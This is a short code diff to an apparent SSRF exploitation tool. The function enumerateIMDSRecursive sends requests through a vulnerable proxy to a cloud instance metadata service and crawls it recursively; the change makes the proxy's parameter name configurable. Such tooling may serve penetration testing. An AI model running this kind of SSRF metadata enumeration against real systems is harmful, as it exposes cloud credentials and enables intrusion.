@@ -15,7 +15,7 @@ export async function enumerateIMDSRecursive(proxyUrl, token, basePath = "/lates
 
   try {
     const metadataUrl = `${CONFIG.imdsv2.baseUrl}${basePath}`;
-    const fullUrl = `${proxyUrl}?url=${metadataUrl}`;
+    const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${metadataUrl}`;
 
     const response = await axios.get(fullUrl, {
       headers: {
@@ -43,7 +43,7 @@ export async function enumerateIMDSRecursive(proxyUrl, token, basePath = "/lates
               }
             } else {
               const itemUrl = `${CONFIG.imdsv2.baseUrl}${fullPath}`;
-              const itemFullUrl = `${proxyUrl}?url=${itemUrl}`;
+              const itemFullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${itemUrl}`;
 
               const itemResponse = await axios.get(itemFullUrl, {
                 headers: {
